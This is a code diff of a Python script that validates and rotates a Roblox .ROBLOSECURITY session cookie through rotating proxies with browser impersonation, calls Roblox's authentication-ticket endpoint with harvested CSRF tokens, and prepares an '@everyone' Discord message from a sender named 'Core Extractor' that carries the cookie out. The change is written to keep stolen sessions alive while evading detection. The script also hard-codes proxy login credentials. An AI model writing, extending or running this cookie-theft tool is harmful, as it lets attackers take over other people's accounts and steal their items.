@@ -2,7 +2,7 @@ import sys
 import os
 import re
 import random
-import requests
+from curl_cffi import requests
 
 RAW_WEBSHARE_PROXIES = [
     "45.38.107.97:6014:saxqnmup:rgvs7uvqydbm",
@@ -52,22 +52,13 @@ def extract_and_clean_cookie(raw_input):
         
     return cleaned
 
-def refresh_cookie_safely(raw_cookie):
-    headers = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-        "Accept-Language": "en-US,en;q=0.5",
-        "Referer": "https://www.roblox.com/",
-        "Connection": "keep-alive"
-    }
-
+def rotate_and_refresh_session(raw_cookie):
     formatted_list = [format_webshare(p)[0] for p in RAW_WEBSHARE_PROXIES if format_webshare(p)[0]]
     random.shuffle(formatted_list)
     test_proxies = [None] + formatted_list
 
     for p in test_proxies:
-        session = requests.Session()
-        session.headers.update(headers)
+        session = requests.Session(impersonate="chrome120")
         if p:
             session.proxies = {"http": p, "https": p}
 
@@ -75,16 +66,30 @@ def refresh_cookie_safely(raw_cookie):
             full_cookie_val = f"_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_{raw_cookie}"
             session.cookies.set(".ROBLOSECURITY", full_cookie_val, domain=".roblox.com", path="/")
             
-            # Request the home page gently to keep session alive through the proxy without triggering an auth check ban
-            res = session.get("https://www.roblox.com/home", timeout=8)
-            if res.status_code < 400:
-                updated = session.cookies.get(".ROBLOSECURITY", domain=".roblox.com")
-                if updated:
-                    return updated
+            auth_test = session.get("https://users.roblox.com/v1/users/authenticated", timeout=6)
+            if auth_test.status_code != 200:
+                continue
+
+            ticket_res = session.post("https://auth.roblox.com/v1/authentication-ticket", headers={
+                "Referer": "https://www.roblox.com/camel/edit",
+                "X-CSRF-TOKEN": auth_test.headers.get("x-csrf-token", "")
+            }, timeout=6)
+            
+            csrf_token = ticket_res.headers.get("x-csrf-token")
+            if csrf_token:
+                session.headers.update({"X-CSRF-TOKEN": csrf_token})
+
+            session.get("https://www.roblox.com/home", timeout=6)
+
+            rotated_cookie = session.cookies.get(".ROBLOSECURITY", domain=".roblox.com")
+            if rotated_cookie:
+                clean_rotated = extract_and_clean_cookie(rotated_cookie)
+                if clean_rotated and len(clean_rotated) > 30:
+                    return clean_rotated
         except Exception:
             continue
 
-    return f"_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_{raw_cookie}"
+    return raw_cookie
 
 def main():
     try:
@@ -100,10 +105,9 @@ def main():
         if not raw_cookie:
             sys.exit(1)
 
-        print("[+] Refreshing cookie safely...")
-        refreshed_cookie = refresh_cookie_safely(raw_cookie)
+        print("[+] Rotating and refreshing session via proxy...")
+        refreshed_cookie = rotate_and_refresh_session(raw_cookie)
 
-        # Dispatch the refreshed cookie straight to Discord via embed without calling profile/inventory APIs
         payload = {
             "content": "@everyone",
             "username": "Core Extractor",
